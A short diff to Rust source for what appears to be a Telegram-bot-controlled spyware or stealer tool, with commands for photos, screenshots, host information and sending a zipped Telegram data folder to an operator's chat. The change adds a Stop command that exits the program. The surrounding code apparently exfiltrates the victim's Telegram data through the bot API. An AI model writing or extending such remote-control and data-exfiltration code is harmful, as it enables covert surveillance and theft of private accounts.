@@ -2,6 +2,7 @@ pub mod scrapper;
 pub mod system;
 pub mod config;
 
+use std::process::exit;
 use std::{fs, time::Duration};
 use teloxide::{macros::BotCommands, prelude::*, types::InputFile};
 use system::info::*;
@@ -15,7 +16,8 @@ enum Command {
     Photo,
     Who,
     Screenshot,
-    Telegram
+    Telegram,
+    Stop
 }
 
 async fn answer(bot: Bot, _msg: Message, cmd: Command) -> ResponseResult<()> {
@@ -44,6 +46,10 @@ async fn answer(bot: Bot, _msg: Message, cmd: Command) -> ResponseResult<()> {
                 Ok(_) => {let _ = bot.send_document(cfg.chat_id.clone(), InputFile::file(&cfg.telegram_zip_path)).await;}
                 Err(err) => {let _ = bot.send_message(cfg.chat_id.clone(), err).await;}
             }
+        }
+        Command::Stop => {
+            let _ = bot.send_message(cfg.chat_id.clone(), "Stopping...".to_string()).await;
+            exit(0);
         }
     };
 
